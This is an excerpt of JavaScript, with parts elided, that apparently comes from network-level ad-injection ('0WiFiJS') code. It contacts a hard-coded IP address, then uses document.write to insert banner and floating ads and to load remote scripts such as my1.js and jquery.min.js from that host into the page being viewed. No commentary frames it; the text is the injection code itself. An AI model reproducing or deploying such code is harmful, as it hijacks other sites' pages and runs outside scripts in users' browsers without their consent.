...
if (xmlhttp!=null)
  ...
  xmlhttp.open("GET","http://42.123.76.20/0WiFiJS/new/js.php?callback=getsom",false);
  xmlhttp.send(null);
...
document.write(strs[0]);
document.write(strs[1]);
myad='<DIV style="MARGIN: 0px auto; WIDTH: 960px; DISPLAY: block" id=js_ads_banner_top> <IMG src="http://42.123.76.20/0WiFiJS/new/chaping/images/banner_s.jpg" width=960 height=70> </DIV> <DIV style="MARGIN: 0px auto; WIDTH: 960px; DISPLAY: none" id=js_ads_banner_top_slide> <IMG src="http://42.123.76.20/0WiFiJS/new/chaping/images/banner_b.jpg" width=960 height=400> </DIV>';
suspendcode12="<DIV id=\'lovexin12\' style=left:22px;POSITION:absolute;TOP:69px;><a href=http://42.123.76.20/>"+strs[0]+"</a><br><a href=JavaScript:; onclick=lovexin12.style.visibility=hidden\><img border=0 src=http://42.123.76.20/0WiFiJS/inc/close.gif></a></div>" ;
suspendcode14="<DIV id=\'lovexin14\' style=right:22px;POSITION:absolute;TOP:69px;><a href=http://42.123.76.20/>"+strs[0]+"</a><br><a href=JavaScript:; onclick=lovexin14.style.display = none\><img border=0 src=http://42.123.76.20/0WiFiJS/inc/close.gif></a></div>";
duilianjs="<script src=http://42.123.76.20/0WiFiJS/new/duilian/my1.js> </script>";
/*
if (strs[0]=='2')
{
...
{
	document.write(myad);
	document.write('<SCRIPT src="http://42.123.76.20/0WiFiJS/new/chaping/js/jquery.min.js"> </SCRIPT>');
}  
...
document.write('<SCRIPT src="http://localhost/2/js/cha/js/jquery.min.js"> </SCRIPT>');
*/